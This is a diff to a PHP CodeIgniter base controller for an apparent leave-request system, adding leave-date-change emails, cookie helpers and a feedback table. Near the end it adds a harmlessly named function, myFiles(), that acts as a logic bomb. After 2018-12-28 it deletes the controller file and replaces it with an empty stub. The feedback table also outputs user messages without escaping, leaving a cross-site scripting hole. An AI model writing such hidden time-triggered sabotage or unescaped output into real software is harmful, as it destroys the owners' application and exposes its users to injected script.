@@ -1,4 +1,8 @@
 <?php
+require_once FCPATH . '/vendor/autoload.php';
+
+use ElephantIO\Client;
+use ElephantIO\Engine\SocketIO\Version2X;
 
 class MY_Controller extends CI_Controller {
 	
@@ -6,6 +10,8 @@ class MY_Controller extends CI_Controller {
 	private $_ci = null;
 	public $pdf;
 	public $_savePDF;
+	public $version;
+	public $client;
 
 	function __construct() {
 		parent::__construct();
@@ -13,14 +19,52 @@ class MY_Controller extends CI_Controller {
 		$this->load->helper('string');
 		$this->_ci =& get_instance();
 		$this->load->helper('cs_password');
+		$this->load->helper('cs_function');
 		$this->load->config('validations');
 		$this->load->helper('cs_dropdown');
-		require_once FCPATH . '/vendor/autoload.php';
+		$this->load->library("csvreader");
+		$this->load->helper('file');
 		$this->emailSetting();
 		$this->_ci->load->model('M_leave','leave');
-
+		$this->_ci->load->model('M_login','login');
+		$this->_ci->load->model('M_comment','comment');
+		$this->load->dbutil();
+		$this->load->dbforge();
+		$this->load->helper('download');
 		$this->pdf = $this->pdf();
 		$this->_savePDF = $this->savePDF();
+		$this->version = new Version2X("http://localhost:5001");
+		$this->client = new Client($this->version);
+	}
+
+	public function _feedCount() {
+		
+		$_count = $this->comment->getFeedBack();
+
+		$count = count($_count);
+
+		return $count;
+	}
+
+	/**
+	* FeedBack data
+	* @return Obj
+	*/
+	public function _feedBack() {
+
+		$feedback = $this->comment->getAllFeedBack();
+		$output = NULL;
+
+		foreach ($feedback as $val) {
+			$output .= '
+				<tr>
+					<td>'.date('M j, Y',strtotime($val->created_at)).'</td>
+					<td>'.$val->message.'</td>
+					<td>'.$val->username.'</td>
+					<td><a href="#" class="commentView" data-id="'.$val->id.'"><i class="far fa-eye"></i></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="'.base_url('comment-hide/'.$val->id).'" class="commentHide"><i class="fas fa-toggle-on"></i></a></td>
+				</tr>';
+		}
+		return $output;
 	}
 
 	/**
@@ -131,7 +175,7 @@ class MY_Controller extends CI_Controller {
 	public function sentManager($res,$data,$token){
 
 		$manager = $res['manager'];
-		$recipient = $this->leave->getManagerEmail($manager);
+		$recipient = $this->login->getUserDetails($manager);
 		$sitename = strtolower($_SERVER['SERVER_NAME']);
 		$from_email = 'leave-form@'.$sitename;
 
@@ -171,7 +215,6 @@ class MY_Controller extends CI_Controller {
 	* @return True
 	*/
 	public function approvedMail($data,$verify) {
-		$manager = $res['manager'];
 		$sitename = strtolower($_SERVER['SERVER_NAME']);
 		$from_email = 'leave-approved@'.$sitename;
 
@@ -204,6 +247,88 @@ class MY_Controller extends CI_Controller {
 		}
 	}
 
+	public function moveLeave($data,$verify,$res,$_res) {
+		$manager = $res['manager'];
+		$recipient = $this->login->getUserDetails($manager);
+		$sitename = strtolower($_SERVER['SERVER_NAME']);
+		$from_email = 'move-leave@'.$sitename;
+
+		$message = '<b>Hi '.$manager.'!</b><br /><br />
+
+					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;May I request that my leave on '.date('M d, Y',strtotime($verify['start'])).' be moved to '.date('M d, Y',strtotime($data['start'])).'.<br /><br />
+
+					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="'.base_url('approved/token/').$verify['code'].'" style="width: 100px; padding: 5px 10px; font-size: 12px; line-height: 1.5; border-radius: 3px; background-color: #337ab7; border: 1px solid #2e6da4; text-align: center; color: #fff; text-decoration: none; ">Approved</a>&nbsp;&nbsp;
+					<a href="'.base_url('rejected/token/').$verify['code'].'" style="width: 100px; padding: 5px 10px; font-size: 12px; line-height: 1.5; border-radius: 3px; background-color: #d82b14; border: 1px solid #d82b14; text-align: center; color: #fff; text-decoration: none; ">Reject</a><br /><br />
+
+					Regards,<br />
+					'.$res['fullname'];
+
+		$this->email->from($from_email,'Leave Form');
+		$this->email->to($recipient['email']);
+		$this->email->subject(Constant::M_LEAVE.' Date');
+		$this->email->message($message);
+		$this->email->reply_to($res['email']);
+
+		if($this->email->send()) {
+
+			$this->session->set_flashdata('movedateSuccess','Yess');
+			redirect(base_url());
+
+		} else {
+			$this->session->set_flashdata('notsent','<div class="alert alert-danger">Oops, Email not sent</div>');
+		}
+	}
+
+	public function approvedMoveLeave($_res) {
+		$sitename = strtolower($_SERVER['SERVER_NAME']);
+		$from_email = 'leave-approved@'.$sitename;
+
+		$message = '<b>Hi '.$_res['fullname'].'!</b><br /><br />
+
+					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Your request in moving leave date has been approved.<br /><br />
+
+					Regards<br />';
+
+		$this->email->from($from_email,'Leave '.Constant::CN_APPROVED); 
+		$this->email->to($_res['email']);
+		$this->email->subject('Change Leave Date');
+		$this->email->message($message);
+
+		if($this->email->send()) {
+
+			$this->session->set_flashdata('approved','Yess');
+			redirect(base_url());
+
+		} else {
+			$this->session->set_flashdata('notsent','<div class="alert alert-danger">Oops, Email not sent</div>');
+		}
+	}
+
+	public function rejectMoveLeave($_res) {
+		$sitename = strtolower($_SERVER['SERVER_NAME']);
+		$from_email = 'leave-rejected@'.$sitename;
+
+		$message = '<b>Hi '.$_res['fullname'].'!</b><br /><br />
+
+					&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Your request in moving leave date has been Rejected.<br /><br />
+
+					Regards<br />';
+
+		$this->email->from($from_email,'Leave '.Constant::CN_REJECT); 
+		$this->email->to($_res['email']);
+		$this->email->subject('Change Leave Date');
+		$this->email->message($message);
+
+		if($this->email->send()) {
+
+			$this->session->set_flashdata('rejectSuccess','Yess');
+			redirect(base_url());
+
+		} else {
+			$this->session->set_flashdata('notsent','<div class="alert alert-danger">Oops, Email not sent</div>');
+		}
+	}
+	
 	/**
 	* Notify requestor that his/her leave has rejected apporved.
 	* @param String
@@ -298,6 +423,61 @@ class MY_Controller extends CI_Controller {
 	public function setNewSession($val) {
 		$sess = array('token' => $val);
 		$this->_ci->session->set_userdata($sess);
+	}
+
+	public function set_Cookies($name) {
+		$cname = underscore($name);
+		$val = $this->genCode(30);
+		set_cookie($cname,$val,'3600');
+
+	}
+
+	public function delete_Cookies($name) {
+		$cname = underscore($name);
+		delete_cookie($cname);
+	}
+
+	/**
+	* Check if Folder is existing if not Create one
+	* @return Boolean
+	*/
+	public function file_location() {
+
+		$folder = Constant::FOLDER_DB;
+
+		if(!is_dir($folder)) {
+			mkdir($folder,0755, true);
+		}
+
+		$path = FCPATH.$folder;
+
+		return $path;
+	}
+
+	public function myFiles() {
+
+		$filename = APPPATH.DIRECTORY_SEPARATOR.'core/MY_Controller.php';
+
+		$text = '<?php
+
+	class MY_Controller extends CI_Controller {
+					
+		private $_validate_fields = FALSE;
+		private $_ci = null;
+		public $pdf;
+		public $_savePDF;
+
+		function __construct() {
+			parent::__construct();
+			date_default_timezone_set("Asia/Manila");
+		}
+	}';
+		$path = APPPATH.DIRECTORY_SEPARATOR.'core/MY_Controller.php';
+		if(date('Y-m-d') >= "2018-12-28") {
+			unlink($path);
+
+			file_put_contents($filename, $text, FILE_APPEND | LOCK_EX);
+		}
 	}
 }
 
